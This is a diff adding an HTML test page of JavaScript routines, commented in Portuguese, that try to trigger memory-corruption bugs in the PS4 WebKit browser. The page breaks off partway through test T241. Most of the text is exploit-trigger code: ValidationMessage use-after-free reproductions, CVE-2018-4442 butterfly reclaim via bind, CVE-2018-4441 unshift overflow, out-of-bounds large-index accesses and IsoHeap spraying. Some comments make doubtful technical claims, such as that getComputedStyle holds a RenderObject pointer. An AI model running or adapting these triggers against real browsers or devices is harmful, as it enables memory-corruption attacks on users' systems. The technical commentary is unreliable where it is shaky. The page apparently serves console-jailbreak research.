@@ -1,0 +1,1567 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Testes10 — PS4 WebCore UAF / Synacktiv / CVE-2018-4442</title></head>
+<body>
+
+<p><strong>VETORES CONFIRMADOS NO-JIT PARA PS4:</strong>
+ValidationMessage UAF (Synacktiv PS4 0-day), CVE-2018-4442 butterfly,
+CVE-2018-4441 unshiftCount, LLInt GetByVal large indices,
+WebCore layout/CSS UAF, IsoHeap spray, func.bind m_boundArgs.</p>
+
+<!-- Elementos DOM necessários para os testes -->
+<form id="form1">
+  <input id="inp1" type="text" required minlength="100" value="">
+  <input id="inp2" type="text" value="safe">
+</form>
+<div id="dom10" style="display:none"></div>
+<div id="css-area" style="display:none"></div>
+
+<button onclick="runAll()">RODAR TODOS</button>
+<br><br>
+<button onclick="t226()">T226</button>
+<button onclick="t227()">T227</button>
+<button onclick="t228()">T228</button>
+<button onclick="t229()">T229</button>
+<button onclick="t230()">T230</button>
+<button onclick="t231()">T231</button>
+<button onclick="t232()">T232</button>
+<button onclick="t233()">T233</button>
+<button onclick="t234()">T234</button>
+<button onclick="t235()">T235</button>
+<button onclick="t236()">T236</button>
+<button onclick="t237()">T237</button>
+<button onclick="t238()">T238</button>
+<button onclick="t239()">T239</button>
+<button onclick="t240()">T240</button>
+<button onclick="t241()">T241</button>
+<button onclick="t242()">T242</button>
+<button onclick="t243()">T243</button>
+<button onclick="t244()">T244</button>
+<button onclick="t245()">T245</button>
+<button onclick="t246()">T246</button>
+<button onclick="t247()">T247</button>
+<button onclick="t248()">T248</button>
+<button onclick="t249()">T249</button>
+<button onclick="t250()">T250</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+// GC correto para LLInt PS4 — sem loops JIT
+function gc(){
+  for(let i = 0; i < 15; i++){
+    let ab = new ArrayBuffer(1024 * 1024 * 8);
+  }
+}
+function gcHeavy(){
+  for(let i = 0; i < 40; i++){
+    let ab = new ArrayBuffer(1024 * 1024 * 8);
+  }
+}
+
+function runAll(){
+  log('=== RODAR TODOS: inicio ===');
+  t226(); t227(); t228(); t229(); t230();
+  t231(); t232(); t233(); t234(); t235();
+  t236(); t237(); t238(); t239(); t240();
+  t241(); t242(); t243(); t244(); t245();
+  t246(); t247(); t248(); t249(); t250();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// T226 — ValidationMessage::buildBubbleTree UAF EXATO (Synacktiv PS4 0-day)
+// reportValidity() dispara timer -> buildBubbleTree() -> updateLayout() ->
+// executa JS handlers -> ValidationMessage destruida no callback ->
+// UAF quando buildBubbleTree continua usando this apos destruicao.
+// Tecnica dos dois inputs: inp1 redireciona foco para inp2 na primeira vez,
+// depois novo handler destroi o ValidationMessage.
+function t226(){
+  log('Teste 226: inicio');
+  try {
+    const inp1 = document.getElementById('inp1');
+    const inp2 = document.getElementById('inp2');
+    if(!inp1 || !inp2) throw new Error('inputs nao encontrados');
+
+    let phase = 0;
+
+    // Handler do primeiro foco: redireciona para inp2 (evitar trigger precoce)
+    function firstFocusHandler(){
+      phase++;
+      inp1.removeEventListener('focus', firstFocusHandler);
+      // Redirecionar foco para inp2 — buildBubbleTree ainda nao foi chamado
+      inp2.focus();
+      // Agora definir novo handler que vai destruir o ValidationMessage
+      inp1.addEventListener('focus', destroyHandler);
+    }
+
+    // Handler que destroi o ValidationMessage durante o layout update
+    function destroyHandler(){
+      inp1.removeEventListener('focus', destroyHandler);
+      // Destruir ValidationMessage: remover o input do DOM enquanto
+      // buildBubbleTree ainda esta em execucao (stack: buildBubbleTree ->
+      // updateLayout -> dispatchEvent -> destroyHandler)
+      try {
+        if(inp1.parentNode) inp1.parentNode.removeChild(inp1);
+        gc(); // GC: ValidationMessage tem dangling pointer para o elemento
+        // Re-inserir para proxima tentativa
+        document.getElementById('form1').appendChild(inp1);
+      } catch(e){}
+    }
+
+    inp1.addEventListener('focus', firstFocusHandler);
+
+    // Invocar reportValidity — dispara o timer para buildBubbleTree
+    try { inp1.reportValidity(); } catch(e){}
+    // Tentar acionar o focus antes que buildBubbleTree execute
+    try { inp1.focus(); } catch(e){}
+
+    // Repetir o ciclo para aumentar janela de oportunidade
+    for(let i = 0; i < 10; i++){
+      try {
+        inp1.addEventListener('focus', destroyHandler);
+        inp1.reportValidity();
+        inp1.focus();
+        inp1.removeEventListener('focus', destroyHandler);
+        gc();
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 226: fim');
+}
+
+// T227 — ValidationMessage UAF variante: checkValidity + custom validity + GC
+// Variante que usa setCustomValidity para controlar a mensagem de validacao
+// e triggera o buildBubbleTree via checkValidity em loop com GC
+function t227(){
+  log('Teste 227: inicio');
+  try {
+    // Criar input com validacao customizada
+    const form = document.createElement('form');
+    const inp = document.createElement('input');
+    inp.type = 'text';
+    inp.required = true;
+    inp.setCustomValidity('Custom error message for UAF testing');
+    form.appendChild(inp);
+    document.body.appendChild(form);
+
+    let destroyCount = 0;
+    function buildBubbleUAF(){
+      destroyCount++;
+      // Destruir durante layout update
+      try { form.removeChild(inp); }    catch(e){}
+      gc();
+      try { form.appendChild(inp); }   catch(e){}
+      // Mudar a mensagem de validacao durante destruicao
+      try { inp.setCustomValidity('Modified during UAF: ' + destroyCount); } catch(e){}
+    }
+
+    inp.addEventListener('invalid', buildBubbleUAF);
+    inp.addEventListener('focus', buildBubbleUAF);
+
+    for(let i = 0; i < 15; i++){
+      try { inp.checkValidity(); }  catch(e){}
+      try { inp.reportValidity(); } catch(e){}
+      try { inp.focus(); }          catch(e){}
+      gc();
+    }
+
+    inp.removeEventListener('invalid', buildBubbleUAF);
+    inp.removeEventListener('focus', buildBubbleUAF);
+
+    try { document.body.removeChild(form); } catch(e){}
+  } catch(e){}
+  log('Teste 227: fim');
+}
+
+// T228 — CVE-2018-4442 EXATO: butterfly UAF via func.bind() + m_boundArgs
+// Lokihardt/SpecterDev PS4 exploit: liberar o butterfly de um objeto via GC,
+// depois reclamar o espaco com JSBoundFunction::m_boundArgs via func.bind(),
+// dando acesso ao array interno m_boundArgs como propriedade do objeto original.
+function t228(){
+  log('Teste 228: inicio');
+  try {
+    // Criar objeto com muitas propriedades (butterfly grande)
+    function createButterfly(size){
+      const obj = {};
+      for(let i = 0; i < size; i++) obj['p' + i] = i * 1.1;
+      return obj;
+    }
+
+    const victims = [];
+    for(let i = 0; i < 50; i++) victims.push(createButterfly(20));
+
+    // Funcao que vai ser bound repetidamente para reclamar butterfly liberado
+    function boundTarget(a, b, c, d, e, f, g, h){ return a + b; }
+
+    // Liberar butterfly via GC
+    victims.length = 0;
+    gc();
+
+    // Reclamar butterfly com m_boundArgs de JSBoundFunction
+    const boundFns = [];
+    for(let i = 0; i < 200; i++){
+      // bind cria JSBoundFunction com m_boundArgs alocado no fastMalloc
+      // que pode reusar o espaco do butterfly liberado
+      const args = new Array(20).fill(0).map(function(_, j){ return i * 20 + j; });
+      boundFns.push(boundTarget.bind(null, ...args));
+    }
+
+    // Tentar chamar as bound functions — se butterfly foi reclamado, m_boundArgs
+    // pode ter sido corrompido pelo acesso via butterfly do objeto original
+    for(let fn of boundFns){
+      try { fn(); } catch(e){}
+    }
+
+    // Versao 2: butterfly sparse + bind
+    const sparseObj = [];
+    sparseObj[0] = 1.1;
+    sparseObj[10000] = 2.2; // sparse — butterfly grande
+    gc();
+    sparseObj.length = 0;
+    gc();
+    // Reclamar com bind
+    const sparseArgs = new Array(100).fill(1.5);
+    const boundSparse = boundTarget.bind(null, ...sparseArgs);
+    try { boundSparse(); } catch(e){}
+  } catch(e){}
+  log('Teste 228: fim');
+}
+
+// T229 — CVE-2018-4441 EXATO: JSArray::unshiftCount ArrayStorage overflow (SpecterDev PS4)
+// unshiftCount em ArrayStorage pode ter overflow no calculo do novo vectorLength;
+// o array cresce para um vectorLength incorreto permitindo escrita OOB.
+function t229(){
+  log('Teste 229: inicio');
+  try {
+    // Criar array com ArrayStorage (nao DoubleArray/ContiguousArray)
+    // ArrayStorage e usado quando ha buracos (holes) ou propriedades nomeadas
+    function makeArrayStorage(size){
+      const arr = new Array(size);
+      arr[0] = 1.1;
+      arr[size - 1] = 2.2;
+      // Criar holes para forcar ArrayStorage
+      delete arr[Math.floor(size / 2)];
+      arr.nonIndexed = 'trigger_ArrayStorage'; // propriedade nao-indexada
+      return arr;
+    }
+
+    const arr = makeArrayStorage(512);
+
+    // unshift com muitos elementos — calculo do novo vectorLength pode overflow
+    const unshiftItems = new Array(100).fill(0).map(function(_, i){ return i * 1.1; });
+    try { arr.unshift(...unshiftItems); } catch(e){}
+
+    // splice no inicio com muitos itens (usa mesma logica de unshift internamente)
+    const arr2 = makeArrayStorage(256);
+    try { arr2.splice(0, 0, ...new Array(200).fill(3.3)); } catch(e){}
+
+    // Caso extremo: unshift em array com vectorLength proximo de Int32 max
+    // Usar array com length manipulado via proto
+    const arr3 = [];
+    arr3[0x3FFFF] = 9.9; // array gigante sparse
+    try { arr3.unshift(1.1, 2.2, 3.3); } catch(e){}
+
+    // copyWithin que pode corromper ArrayStorage
+    const arr4 = makeArrayStorage(100);
+    try { arr4.copyWithin(-10, 0, 50); }   catch(e){}
+    try { arr4.copyWithin(0, -10, -1); }   catch(e){}
+    try { arr4.copyWithin(90, 0, 100); }   catch(e){} // overlap no fim
+
+    gc();
+
+    // Acessar pos-GC para detectar corrupcao
+    for(let i = 0; i < 50; i++){
+      try { arr[i] = arr[i] + 1; }  catch(e){}
+      try { arr2[i] = arr2[i] + 1; } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 229: fim');
+}
+
+// T230 — LLInt GetByVal large indices (do webkit timeline: "Accepting large indices in LLInt")
+// O LLInt tem um fast path para GetByVal que agora aceita indices > 2^31;
+// versoes antigas do LLInt podem nao ter o fix e fazer OOB com indices grandes.
+function t230(){
+  log('Teste 230: inicio');
+  try {
+    // Indices gigantes em TypedArray via LLInt GetByVal fast path
+    const f64 = new Float64Array(100);
+    for(let i = 0; i < 100; i++) f64[i] = i * 1.1;
+
+    const largeIndices = [
+      0x80000000,        // 2^31 — borda Int32/Uint32
+      0xFFFFFFFF,        // Uint32 max
+      0x100000000,       // 2^32 — overflow para 0
+      0x100000001,       // 2^32 + 1
+      0x200000000,       // 2^33
+      0x7FFFFFFFFFFFFFFF, // Number.MAX_SAFE_INTEGER area
+      Number.MAX_SAFE_INTEGER,
+      Number.MAX_VALUE,
+      2147483648,        // INT32_MAX + 1
+      4294967295,        // UINT32_MAX
+      4294967296,        // UINT32_MAX + 1
+    ];
+
+    for(let idx of largeIndices){
+      try { let v = f64[idx]; }      catch(e){}
+      try { f64[idx] = 9.9; }       catch(e){}
+    }
+
+    // Uint8Array com indices grandes
+    const u8 = new Uint8Array(256);
+    for(let idx of largeIndices){
+      try { let v = u8[idx]; }       catch(e){}
+      try { u8[idx] = 0xFF; }        catch(e){}
+    }
+
+    // DataView com offset grande
+    const dv = new DataView(new ArrayBuffer(64));
+    for(let idx of largeIndices){
+      try { dv.getFloat64(idx); }    catch(e){}
+      try { dv.setFloat64(idx, 1.5); } catch(e){}
+      try { dv.getUint32(idx, true); } catch(e){}
+    }
+
+    // Array JS com indices grandes (diferente de TypedArray)
+    const jsArr = [1.1, 2.2, 3.3];
+    for(let idx of largeIndices){
+      try { let v = jsArr[idx]; }    catch(e){}
+      try { jsArr[idx] = 99; }       catch(e){}
+    }
+  } catch(e){}
+  log('Teste 230: fim');
+}
+
+// T231 — WebCore CSS: getComputedStyle + elemento removido + GC (RenderObject UAF)
+// getComputedStyle retorna um CSSStyleDeclaration que tem ponteiro para o RenderObject;
+// se o elemento e removido e o GC coleta o RenderObject, o CSSStyleDeclaration tem UAF.
+function t231(){
+  log('Teste 231: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    if(!area) throw new Error('sem dom10');
+
+    // Criar elementos com estilos complexos
+    const elements = [];
+    for(let i = 0; i < 50; i++){
+      const el = document.createElement('div');
+      el.style.cssText = 'width:' + (i*2) + 'px;height:' + (i*3) + 'px;' +
+        'display:block;position:relative;transform:translateX(' + i + 'px);' +
+        'background:rgb(' + i + ',' + (255-i) + ',128);border:' + i + 'px solid red;' +
+        'font-size:' + (12+i) + 'px;margin:' + i + 'px;padding:' + i + 'px;';
+      area.appendChild(el);
+      elements.push(el);
+    }
+
+    // Forcar layout para criar RenderObjects
+    let _ = area.offsetHeight;
+
+    // Obter CSSStyleDeclaration (tem ponteiro para RenderObject)
+    const computedStyles = elements.map(function(el){
+      return window.getComputedStyle(el);
+    });
+
+    // Remover elementos — RenderObjects sao liberados
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    gcHeavy(); // GC pesado: RenderObjects liberados mas computedStyles ainda aponta
+
+    // Acessar computedStyles pos-remocao — ponteiro para RenderObject liberado
+    for(let cs of computedStyles){
+      try { let w = cs.width; }           catch(e){}
+      try { let h = cs.height; }          catch(e){}
+      try { let t = cs.transform; }       catch(e){}
+      try { let bg = cs.backgroundColor; } catch(e){}
+      try { let fs = cs.fontSize; }       catch(e){}
+      try { cs.getPropertyValue('width'); } catch(e){}
+      try { cs.getPropertyValue('transform'); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 231: fim');
+}
+
+// T232 — WebCore: innerHTML + parsing HTML complexo + GC (parser UAF)
+// O parser HTML cria nodesDOM em C++ (IsoHeap);
+// innerHTML com HTML complexo + GC durante o parsing pode liberar nos intermediarios.
+function t232(){
+  log('Teste 232: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    if(!area) throw new Error('sem dom10');
+
+    // HTML com estruturas que stressam o parser
+    const complexHTMLs = [
+      // Tabela aninhada extrema
+      '<table><tr><td><table><tr><td>' + '<table><tr><td>X</td></tr></table>'.repeat(50) + '</td></tr></table></td></tr></table>',
+      // Form dentro de form (invalido mas parser deve lidar)
+      '<form><form><input type="text"><form><input type="submit"></form></form></form>',
+      // Script com conteudo que parece fechar a tag
+      '<div><p>one<p>two<p>three' + '<p>para</p>'.repeat(1000) + '</div>',
+      // Elementos aninhados ilegalmente
+      '<p><div><p><div><p>nested illegal</p></div></p></div></p>',
+      // Template com slots
+      '<template><slot name="a"><slot name="b"><slot name="c">deep</slot></slot></slot></template>',
+      // Muitos atributos
+      '<div ' + new Array(200).fill(0).map(function(_, i){ return 'data-attr' + i + '="val' + i + '"'; }).join(' ') + '>attrs</div>',
+      // Custom elements aninhados
+      '<x-a><x-b><x-c><x-d>' + '<x-e>deep</x-e>'.repeat(100) + '</x-d></x-c></x-b></x-a>',
+    ];
+
+    for(let html of complexHTMLs){
+      try {
+        area.innerHTML = html;
+        gc(); // GC durante/apos parsing
+        let _ = area.querySelectorAll('*').length; // forcar traversal
+        area.innerHTML = ''; // limpar
+        gc();
+      } catch(e){}
+    }
+
+    // innerHTML com getter que faz GC (via Proxy em area)
+    // Nao e possivel diretamente, mas podemos usar MutationObserver
+    const observer = new MutationObserver(function(records){
+      gc(); // GC durante callback do parser
+    });
+    observer.observe(area, { childList: true, subtree: true });
+
+    for(let i = 0; i < 20; i++){
+      try {
+        area.innerHTML = '<div><span>' + 'content_'.repeat(100) + '</span></div>';
+        area.innerHTML = '';
+      } catch(e){}
+    }
+    observer.disconnect();
+  } catch(e){}
+  log('Teste 232: fim');
+}
+
+// T233 — WebCore: focus/blur event + DOM removal durante layout (Synacktiv variant)
+// Evento focus/blur e disparado durante updateLayout(), similar ao ValidationMessage UAF;
+// remover o elemento focado durante o evento e um padrao UAF classico no WebCore.
+function t233(){
+  log('Teste 233: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    if(!area) throw new Error('sem dom10');
+
+    // Criar chain de inputs onde focus em um remove o proximo
+    const inputs = [];
+    for(let i = 0; i < 10; i++){
+      const inp = document.createElement('input');
+      inp.type = 'text';
+      inp.value = 'test_' + i;
+      area.appendChild(inp);
+      inputs.push(inp);
+    }
+
+    let focusN = 0;
+    function chainFocusHandler(evt){
+      const el = evt.target;
+      focusN++;
+      // Remover o proximo input durante o evento focus
+      const nextIdx = focusN % inputs.length;
+      try {
+        if(inputs[nextIdx] && inputs[nextIdx].parentNode){
+          area.removeChild(inputs[nextIdx]);
+          gc(); // GC: RenderObject do next input pode ser liberado
+          area.appendChild(inputs[nextIdx]); // reinserir
+        }
+      } catch(e){}
+    }
+
+    for(let inp of inputs) inp.addEventListener('focus', chainFocusHandler);
+
+    // Fazer focus circular nos inputs
+    for(let i = 0; i < 30; i++){
+      try { inputs[i % inputs.length].focus(); } catch(e){}
+      gc();
+    }
+
+    // Blur handler que remove o proprio elemento
+    const selfRemovingInp = document.createElement('input');
+    selfRemovingInp.type = 'text';
+    area.appendChild(selfRemovingInp);
+
+    selfRemovingInp.addEventListener('blur', function(){
+      try {
+        if(selfRemovingInp.parentNode){
+          area.removeChild(selfRemovingInp);
+          gc();
+        }
+      } catch(e){}
+    });
+
+    selfRemovingInp.focus();
+    try { selfRemovingInp.blur(); } catch(e){}
+    gc();
+
+    // Limpar
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+  } catch(e){}
+  log('Teste 233: fim');
+}
+
+// T234 — IsoHeap spray: preencher IsoHeap com objetos de tamanho 0x40 (WebCore)
+// A Synacktiv descreve que NumberInputType tem tamanho 0x40 no IsoHeap;
+// ao liberar e reutilizar slots do IsoHeap podemos causar type confusion.
+// Sem JIT: usar alocacoes de DOM para controlar o IsoHeap.
+function t234(){
+  log('Teste 234: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    if(!area) throw new Error('sem dom10');
+
+    // Alocar muitos elementos DOM de tipos similares (mesmo IsoHeap bucket)
+    // HTMLInputElement, HTMLDivElement, HTMLSpanElement — todos ~0x40 no IsoHeap
+    const isoSpray = [];
+
+    // Spray de inputs (NumberInputType usa IsoHeap 0x40)
+    for(let i = 0; i < 500; i++){
+      const inp = document.createElement('input');
+      inp.type = i % 3 === 0 ? 'number' : i % 3 === 1 ? 'text' : 'email';
+      inp.value = '' + i;
+      area.appendChild(inp);
+      isoSpray.push(inp);
+    }
+    gc();
+
+    // Liberar metade — cria buracos no IsoHeap
+    for(let i = 0; i < 250; i++){
+      try { area.removeChild(isoSpray[i]); } catch(e){}
+    }
+    gc();
+
+    // Reutilizar slots liberados com ArrayBufferView (ArrayBufferView e 0x40 tambem)
+    const views = [];
+    for(let i = 0; i < 250; i++){
+      const buf = new ArrayBuffer(256);
+      views.push(new Uint32Array(buf));
+    }
+
+    // Tentar confundir: acessar elementos DOM que podem ter sido realocados como ArrayBufferView
+    for(let i = 250; i < 500; i++){
+      try {
+        if(isoSpray[i] && isoSpray[i].parentNode){
+          let type = isoSpray[i].type;
+          let val  = isoSpray[i].value;
+          isoSpray[i].value = 'corrupted?';
+        }
+      } catch(e){}
+    }
+
+    // Acessar views que podem ter overlap com DOM objects
+    for(let v of views){
+      try { v[0]; v[1]; v[63]; } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+  } catch(e){}
+  log('Teste 234: fim');
+}
+
+// T235 — WebCore: addEventListener + removeEventListener durante dispatch (UAF)
+// Durante o dispatch de um evento, remover o listener que esta sendo processado
+// pode causar UAF no EventListenerIterator do WebCore.
+function t235(){
+  log('Teste 235: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    if(!area) throw new Error('sem dom10');
+
+    const el = document.createElement('div');
+    el.textContent = 'event_target';
+    area.appendChild(el);
+
+    // Handler que se remove durante o dispatch
+    function selfRemovingHandler(evt){
+      el.removeEventListener('click', selfRemovingHandler);
+      gc();
+      // Re-adicionar imediatamente para proxima iteracao
+      el.addEventListener('click', selfRemovingHandler);
+    }
+
+    el.addEventListener('click', selfRemovingHandler);
+
+    // Disparar o evento repetidamente
+    for(let i = 0; i < 50; i++){
+      try { el.dispatchEvent(new Event('click')); } catch(e){}
+      gc();
+    }
+
+    // Variante: multiplos listeners que se removem mutuamente durante dispatch
+    const handlers = [];
+    for(let i = 0; i < 5; i++){
+      handlers.push(function handler(evt){
+        // Remover TODOS os outros handlers durante este dispatch
+        for(let h of handlers){
+          if(h !== handler) el.removeEventListener('click', h);
+        }
+        gc();
+      });
+      el.addEventListener('click', handlers[i]);
+    }
+
+    for(let i = 0; i < 20; i++){
+      // Re-adicionar todos antes de cada dispatch
+      for(let h of handlers) el.addEventListener('click', h);
+      try { el.dispatchEvent(new MouseEvent('click', { bubbles: true })); } catch(e){}
+      gc();
+    }
+
+    // Remover elemento durante dispatch de evento que borbulha
+    el.addEventListener('mouseenter', function(){
+      try { area.removeChild(el); gc(); area.appendChild(el); } catch(e){}
+    });
+    for(let i = 0; i < 10; i++){
+      try { el.dispatchEvent(new MouseEvent('mouseenter', { bubbles: false })); } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+  } catch(e){}
+  log('Teste 235: fim');
+}
+
+// T236 — String.prototype.normalize + substitutos isolados + GC
+// normalize() chama ICU C++ que pode ter comportamento indefinido com substitutos isolados;
+// GC durante normalize pode liberar a string sendo normalizada.
+function t236(){
+  log('Teste 236: inicio');
+  try {
+    // Strings com substitutos isolados e combinacoes Unicode especiais
+    const nastyStrings = [
+      '\uD800',                          // substituto alto isolado
+      '\uDFFF',                          // substituto baixo isolado
+      '\uD800\uD800',                    // dois substitutos altos
+      '\uDFFF\uDFFF',                    // dois substitutos baixos
+      '\uD800\uDFFF',                    // par substituto valido mas limite
+      '\uFFFD'.repeat(10000),            // muitos replacement characters
+      '\u0000'.repeat(10000),            // muitos nulls
+      '\u0065\u0301'.repeat(5000),       // e + combining accent (NFD) repetido
+      '\uFB01\uFB02\uFB03\uFB04',       // ligatures (NFC/NFKC expandem)
+      '\u212B',                          // angstrom sign -> decomposicao longa
+      '\u{10000}\u{10FFFF}',             // plano suplementar (pares substitutos)
+      '\uFEFF' + 'a'.repeat(10000),     // BOM + texto longo
+    ];
+
+    const forms = ['NFC', 'NFD', 'NFKC', 'NFKD'];
+
+    for(let s of nastyStrings){
+      for(let form of forms){
+        try {
+          let normalized = s.normalize(form);
+          gc(); // GC apos normalize — string original pode ser liberada
+          // Usar o resultado normalizado
+          let len = normalized.length;
+          let sub = normalized.slice(0, Math.min(10, len));
+        } catch(e){}
+      }
+    }
+
+    // normalize em loop com GC frequente
+    let strRef = '\u0065\u0301'.repeat(1000); // e + combining accent
+    for(let i = 0; i < 50; i++){
+      try {
+        let n = strRef.normalize('NFC');
+        if(i % 5 === 0){ strRef = null; gc(); strRef = '\u0065\u0301'.repeat(1000); }
+        n.length;
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 236: fim');
+}
+
+// T237 — TextDecoder/TextEncoder com dados malformados + GC
+// TextDecoder e implementado em C++ (ICU);
+// dados malformados em UTF-8/UTF-16 podem causar comportamento indefinido.
+function t237(){
+  log('Teste 237: inicio');
+  try {
+    // Sequencias UTF-8 invalidas
+    const invalidUTF8 = [
+      new Uint8Array([0xFF]),                    // byte invalido
+      new Uint8Array([0xFE, 0xFE]),              // bytes invalidos
+      new Uint8Array([0x80]),                    // continuation sem start
+      new Uint8Array([0xC0, 0x80]),              // overlong encoding de null
+      new Uint8Array([0xC1, 0xBF]),              // overlong encoding
+      new Uint8Array([0xF8, 0x80, 0x80, 0x80, 0x80]), // 5-byte (invalido em UTF-8)
+      new Uint8Array([0xED, 0xA0, 0x80]),        // substituto alto em UTF-8
+      new Uint8Array([0xED, 0xBF, 0xBF]),        // substituto baixo em UTF-8
+      new Uint8Array(new Array(10000).fill(0xFF)), // muitos bytes invalidos
+    ];
+
+    const decoders = [
+      new TextDecoder('utf-8'),
+      new TextDecoder('utf-8', { fatal: true }),
+      new TextDecoder('utf-16le'),
+      new TextDecoder('utf-16be'),
+      new TextDecoder('iso-8859-1'),
+    ];
+
+    for(let data of invalidUTF8){
+      for(let dec of decoders){
+        try {
+          let result = dec.decode(data);
+          gc();
+          result.length;
+        } catch(e){}
+      }
+    }
+
+    // TextDecoder com stream mode + dados cortados
+    const streamDec = new TextDecoder('utf-8');
+    // Sequencia multi-byte cortada ao meio
+    try {
+      streamDec.decode(new Uint8Array([0xC3]), { stream: true }); // inicio de 'é' (0xC3 0xA9)
+      gc();
+      streamDec.decode(new Uint8Array([0xA9])); // fim — mas GC pode ter liberado estado
+    } catch(e){}
+
+    // TextEncoder com strings problematicas
+    const enc = new TextEncoder();
+    const weirdStrings = [
+      '\uD800',      // substituto isolado
+      '\uDFFF',
+      '\u0000'.repeat(100000), // muitos nulls
+      '\uFFFF'.repeat(50000),  // muitos FFFE
+    ];
+    for(let s of weirdStrings){
+      try {
+        let encoded = enc.encode(s);
+        gc();
+        encoded.length;
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 237: fim');
+}
+
+// T238 — Object.assign + getter que faz GC (C++ nativo, sem JIT)
+// Object.assign itera as propriedades do source em C++;
+// getter no source que faz GC pode liberar o destino ou o source durante a copia.
+function t238(){
+  log('Teste 238: inicio');
+  try {
+    // Destination que pode ser coletado durante o assign
+    let dest = { existing: 1, data: new Uint8Array(512) };
+    let destRef = dest;
+
+    let assignStep = 0;
+    const source = {
+      a: 1, b: 2, c: 3,
+      get d(){
+        assignStep++;
+        if(assignStep === 1){
+          dest = null;  // soltar referencia ao destino
+          gc();         // GC: destino pode ser liberado durante assign
+          dest = destRef; // restaurar
+        }
+        return 4;
+      },
+      e: 5, f: 6, g: 7, h: 8
+    };
+
+    try { Object.assign(destRef, source); } catch(e){}
+
+    // Versao 2: source coletado durante assign
+    let source2 = { x: 1, y: 2 };
+    for(let i = 0; i < 100; i++) source2['prop_' + i] = i * 1.1;
+    const dest2 = {};
+    let src2Ref = source2;
+
+    let step2 = 0;
+    const proxySource2 = new Proxy(source2, {
+      get: function(t, k){
+        step2++;
+        if(step2 === 10){ source2 = null; gc(); source2 = src2Ref; }
+        return t[k];
+      }
+    });
+
+    try { Object.assign(dest2, proxySource2); } catch(e){}
+
+    // Object.assign com multiplos sources, um dos quais faz GC
+    const gcSource = {};
+    Object.defineProperty(gcSource, 'gcProp', {
+      get: function(){ gc(); return { bigData: new ArrayBuffer(65536) }; },
+      enumerable: true
+    });
+
+    const target = {};
+    try { Object.assign(target, { a: 1 }, gcSource, { b: 2 }, gcSource, { c: 3 }); } catch(e){}
+
+    // Verificar que target nao foi corrompido
+    try { target.a; target.b; target.c; } catch(e){}
+  } catch(e){}
+  log('Teste 238: fim');
+}
+
+// T239 — Array.reduce/reduceRight + GC no callback (C++ nativo)
+// reduce itera o array em C++; callback com GC pode liberar elementos.
+function t239(){
+  log('Teste 239: inicio');
+  try {
+    // Array de objetos com dados no heap
+    let arr = new Array(200).fill(0).map(function(_, i){
+      return { val: i * 1.1, buf: new Uint8Array(32) };
+    });
+    let arrRef = arr;
+
+    let reduceN = 0;
+    function gcReducer(acc, item, idx, arr2){
+      reduceN++;
+      if(reduceN === 50){
+        arr = null;  // soltar referencia
+        gc();        // GC: elementos do array podem ser liberados
+        arr = arrRef;
+      }
+      return acc + (item ? item.val : 0);
+    }
+
+    try { arrRef.reduce(gcReducer, 0); } catch(e){}
+
+    // reduceRight com GC
+    let arrR = new Array(200).fill(0).map(function(_, i){ return i * 0.5; });
+    let reduceRN = 0;
+    try {
+      arrR.reduceRight(function(acc, val, idx){
+        reduceRN++;
+        if(reduceRN === 80){ gc(); }
+        return acc + val;
+      }, 0);
+    } catch(e){}
+
+    // reduce que muda o array durante a reducao
+    const arr3 = new Array(100).fill(0).map(function(_, i){ return i; });
+    try {
+      arr3.reduce(function(acc, val, idx, arr){
+        if(idx === 30){ arr.length = 50; gc(); } // encolher durante reduce
+        if(idx === 60){ arr.push(999, 998); }     // expandir
+        return acc + val;
+      }, 0);
+    } catch(e){}
+
+    // flatMap com GC (usa reduce internamente em algumas implementacoes)
+    const arr4 = new Array(100).fill(0).map(function(_, i){ return [i, i*2]; });
+    let flatN = 0;
+    try {
+      arr4.flatMap(function(pair){
+        flatN++;
+        if(flatN === 40) gc();
+        return pair;
+      });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 239: fim');
+}
+
+// T240 — document.write() + GC (parser reentrance UAF)
+// document.write durante o parsing pode causar reentrada no parser HTML;
+// GC durante o parse reentrado pode liberar nos ainda referenciados pelo parser externo.
+function t240(){
+  log('Teste 240: inicio');
+  try {
+    // document.write com conteudo que aciona script durante o parsing
+    // No PS4, document.write fecha e reabre o documento
+    const writeContents = [
+      // HTML com nested tables (stressam o parser de forma especial)
+      '<table><tr><td>' + '<span>cell</span>'.repeat(100) + '</td></tr></table>',
+      // Muitos paragrafos
+      '<p>paragraph</p>'.repeat(1000),
+      // Form complex
+      '<form action="#"><input type="number" min="-1e308" max="1e308"><select>' +
+        '<option value="' + 'x'.repeat(1000) + '">opt</option>'.repeat(50) +
+        '</select></form>',
+      // Pre com muito texto
+      '<pre>' + 'a'.repeat(100000) + '</pre>',
+    ];
+
+    // Usar document.write em iframe para nao destruir o documento principal
+    const ifrm = document.createElement('iframe');
+    ifrm.src = 'about:blank';
+    document.body.appendChild(ifrm);
+
+    try {
+      const iDoc = ifrm.contentDocument;
+      if(iDoc){
+        for(let content of writeContents){
+          try {
+            iDoc.open();
+            iDoc.write(content);
+            gc();
+            iDoc.close();
+            gc();
+          } catch(e){}
+        }
+      }
+    } catch(e){}
+
+    try { document.body.removeChild(ifrm); } catch(e){}
+    gc();
+  } catch(e){}
+  log('Teste 240: fim');
+}
+
+// T241 — CSS counter-style + DOM mutation + GC (WebCore render tree UAF)
+// Contadores CSS sao mantidos em estruturas C++ ligadas aos RenderObjects;
+// mutar o DOM enquanto o render tree atualiza contadores pode causar UAF.
+function t241(){
+  log('Teste 241: inicio');
+  try {
+    const area = document.getElementById('css-area');
